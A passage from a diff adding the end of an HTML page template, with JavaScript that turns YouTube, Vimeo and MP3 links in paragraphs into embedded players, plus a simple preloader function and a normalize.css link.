+                if(loop==1) theInnerHTML += '&loop=1&playlist='+youtube_id+'&version=3';
+                theInnerHTML += '" frameborder="0" allowfullscreen></iframe></div>';
+                p[i].innerHTML = theInnerHTML;
+            }
+            if(p[i].innerHTML.indexOf('vimeo.com') !== -1) {
+                //ask vimeo for the id and place the embed
+                vimeo_embed(p[i].innerHTML,p[i]);
+            }
+        }
+    }
+}
+video_embed();
+
+function mp3_embed() {
+    var p = document.getElementsByTagName('p');
+    for(var i = 0; i < p.length; i++) {
+        if(p[i].innerHTML.indexOf('.mp3') !== -1) {
+            var str = p[i].innerHTML.split('?');
+            if(str.length == 1) str[1] = '';
+            var str1 = str[1];
+            str1 = str1.replace('&','').replace('&','');
+            str1 = str1.replace('autoplay=1','').replace('autoplay=0','');
+            str1 = str1.replace('loop=1','').replace('loop=0','');
+            str1 = str1.replace('controls=0','').replace('controls=1','');
+
+            if (str[0].lastIndexOf('.mp3', str[0].length - 4) === str[0].length - 4 && str1.length == 0) {
+                if(str[1].indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+                if(str[1].indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+                if(str[1].indexOf('controls=0') !== -1) var controls=0; else var controls=1;
+                var newInnerHTML = '<audio';
+                if(autoplay==1) newInnerHTML += ' autoplay';
+                if(loop==1) newInnerHTML += ' loop';
+                if(controls==1) newInnerHTML += ' controls';
+                newInnerHTML += '><source src="'+str[0]+'" type="audio/mpeg">Your browser does not support the audio element.</audio>';
+                p[i].innerHTML = newInnerHTML;
+            }
+        }
+    }
+}
+mp3_embed();
+</script>
+
+
+<!-- preloder script -->
+<script>
+    var preloader = document.getElementById("loader");
+    function loaderFunc(){
+      preloader.style.display = 'none';
+    };
+</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<!-- end -->
+
+</body>
+</html>
